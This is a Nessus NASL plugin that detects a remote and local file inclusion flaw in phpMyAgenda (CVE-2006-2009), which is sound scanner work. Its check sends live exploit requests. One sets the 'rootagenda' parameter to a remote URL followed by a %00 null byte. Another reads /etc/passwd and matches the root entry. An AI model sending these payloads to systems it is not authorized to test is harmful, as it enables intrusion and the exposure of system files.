#
# Script Written By Ferdy Riphagen 
# <f[dot]riphagen[at]nsec[dot]nl>
#
# Script distributed under the GNU GPLv2 License.
#
# Original advisory / discovered by : 
# http://www.securityfocus.com/archive/1/431862/30/0/threaded
#


include("compat.inc");

if (description) {
 script_id(21305);
 script_version("$Revision: 1.13 $");

 script_cve_id("CVE-2006-2009");
 script_bugtraq_id(17670);
 script_osvdb_id(
   24943, 
   29148, 
   29149, 
   29150, 
   29151
 );

 name["english"] = "phpMyAgenda rootagenda Parameter File Include Vulnerability";
 script_name(english:name["english"]);
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is prone to
remote and local file inclusion attacks." );
 script_set_attribute(attribute:"description", value:
"phpMyAgenda is installed on the remote system.  It's an open source
event management system written in PHP. 

The application does not sanitize the 'rootagenda' parameter in some
of its files.  This may allow an attacker to include arbitrary files,
possibly taken from third-party systems, and parse them with
privileges of the account under which the web server operates. 

Successful exploitation of this issue requires that PHP's
'register_globals' setting be enabled." );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/431862/30/0/threaded" );
 script_set_attribute(attribute:"solution", value:
"Disable PHP's 'register_globals' setting." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:W/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2006/05/03");
 script_set_attribute(attribute:"vuln_publication_date", value: "2006/04/24");
 script_cvs_date("$Date: 2012/09/10 21:41:20 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"cpe",value:"cpe:/a:phpmyagenda:phpmyagenda");
script_end_attributes();

 summary["english"] = "Checks for a possible file inclusion flaw in phpMyAgenda";
 script_summary(english:summary["english"]);

 script_category(ACT_ATTACK);
 script_family(english:"CGI abuses");
 script_copyright(english:"This script is Copyright (C) 2006-2012 Ferdy Riphagen");

 script_dependencie("http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_require_keys("www/PHP");
 exit(0);
}

include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

port = get_http_port(default:80);
if (get_kb_item("Services/www/"+port+"/embedded")) exit(0);
if (!can_host_php(port:port)) exit(0);

if (thorough_tests) dirs = list_uniq(make_list("/phpmyagenda", "/agenda", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs) {
 req = http_get(item:string(dir, "/agenda.php3"), port:port);
 #debug_print("request1= ", req, "\n");

 res = http_keepalive_send_recv(data:req, bodyonly:TRUE, port:port);
 #debug_print("res: ", res, "\n");
 
 if(egrep(pattern:"<a href=[^?]+\?modeagenda=calendar", string:res)) {
  file[0] = string("http://", get_host_name(), dir, "/bugreport.txt");
  file[1] = "/etc/passwd";

  req = http_get(item:string(dir, "/infoevent.php3?rootagenda=", file[0], "%00"), port:port);
  #debug_print("request1= ", req, "\n");

  recv = http_keepalive_send_recv(data:req, bodyonly:TRUE, port:port);
  #debug_print("receive1= ", recv, "\n");
  if (recv == NULL) exit(0);

  if ("Bug report for phpMyAgenda" >< recv) {
   security_hole(port);
   exit(0);
  }
  else { 
   # Maybe PHP's 'allow_url_fopen' is set to Off on the remote host.
   # In this case, try a local file inclusion.
   req2 = http_get(item:string(dir, "/infoevent.php3?rootagenda=", file[1], "%00"), port:port);
   #debug_print("request2= ", req2, "\n");

   recv2 = http_keepalive_send_recv(data:req2, bodyonly:TRUE, port:port);
   #debug_print("receive2= ", recv2, "\n");
   if (recv2 == NULL) exit(0);
  
   if (egrep(pattern:"root:.*:0:[01]:.*:", string:recv2)) {
    # PHP's 'register_globals' and 'magic_quotes_gpc' are enabled on the remote host.
    security_hole(port);
    exit(0);
   }
  }
 }
}
